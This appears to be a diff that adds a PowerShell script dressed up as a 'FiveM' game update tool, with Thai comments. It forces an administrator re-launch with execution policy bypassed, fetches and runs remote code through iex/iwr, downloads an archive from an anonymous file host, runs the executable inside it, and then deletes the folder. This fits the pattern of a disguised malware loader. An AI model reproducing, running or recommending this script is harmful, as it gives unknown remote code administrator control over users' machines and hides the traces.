@@ -1,0 +1,37 @@
+# 1. บังคับขอสิทธิ์ Administrator
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((iwr 'https://raw.githubusercontent.com/nphathrbuychi-boop/Cmdivem/refs/heads/main/Cmdivem').Content)`"" -Verb RunAs
+    exit
+}
+
+# 2. ตั้งค่าตัวแปร (ลิงก์ไฟล์ใหม่ของคุณ)
+$url = "https://files.catbox.moe/2vqzh2.rar"
+$workDir = "$env:LOCALAPPDATA\FiveM_Update_Tool"
+$rarPath = Join-Path $workDir "package.rar"
+
+# ล้างโฟลเดอร์เก่า
+if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
+New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+
+# 3. ดาวน์โหลดและแตกไฟล์
+Write-Host "[*] Downloading New Package..." -ForegroundColor Cyan
+Invoke-WebRequest -Uri $url -OutFile $rarPath -UseBasicParsing
+
+Write-Host "[*] Extracting files..." -ForegroundColor Cyan
+# ใช้ tar ในการแตกไฟล์ (รองรับใน Windows 10/11)
+cmd /c "tar -xf `"$rarPath`" -C `"$workDir`""
+
+# 4. รันโปรแกรมหลัก
+$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
+
+if ($exe) {
+    Write-Host "[+] Launching: $($exe.Name)" -ForegroundColor Green
+    # รันจาก Directory ของไฟล์เพื่อให้โหลด DLL ได้ 100%
+    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
+} else {
+    Write-Host "[!] Error: No executable found." -ForegroundColor Red
+    Pause
+}
+
+# 5. ลบไฟล์ทิ้งหลังปิดโปรแกรม
+Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
